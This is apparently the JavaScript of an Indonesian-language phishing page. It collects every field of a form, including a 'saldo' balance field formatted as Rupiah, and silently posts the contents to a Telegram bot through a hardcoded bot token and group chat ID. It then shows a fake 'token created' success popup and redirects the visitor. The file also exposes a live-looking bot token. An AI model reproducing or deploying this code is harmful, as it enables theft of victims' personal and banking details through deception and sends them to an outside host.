

const token = '8175304203:AAH8R3p_vyCAcTJudSTASPsWVkwtE6XteYE'
const group_Id = '-4618790679'

const formtelegram = document.getElementById('formTele')


const sendMessage = (text) => {
    Swal.fire({
        title: "Sedang Proses...",
        text: "Mohon Menunggu Sebentar"
      })

      Swal.showLoading()

      setTimeout((myGreeting) => {

        Swal.fire(
          'Berhasil!!',
          'Token Berhasil Dibuat',
          'success',
          
      )          
      }, 3000);

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "chat_id": group_Id,
            "text": text,
        })
    }).then(res => {
        if(!res.ok) {
            throw new Error(res.statusText, res.status, res.url);
        }

        return res.json();
    }).then(res => {
        console.log(res);
    document.getElementById('kirims').innerHTML = "Selanjutnya";
    setTimeout(function() {
        window.location.href = "akhir.html";
      }, 3000); // 5000 milidetik (5 detik)
 
    }).catch(err => {
        console.log(err);
        alert('gagal')
    })
    
};

formtelegram.onsubmit = (e) => {
    e.preventDefault();        
    
    const formData = new FormData(formtelegram)

    let text ='';

    for(const [key, val] of formData) {
        console.log(`${key}:`,val);
    
        text += `\n\n${key}:\n${val}`;
    
    }

    text = text.replace('\n\n', '');

    sendMessage(text)


}
var dengan_rupiah = document.getElementById('saldo');
    dengan_rupiah.addEventListener('keyup', function(e)
    {
        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
    });
    
    /* Fungsi */
    function formatRupiah(angka, prefix)
    {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split    = number_string.split(','),
            sisa     = split[0].length % 3,
            rupiah     = split[0].substr(0, sisa),
            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
            
        if (ribuan) {
            separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
    }
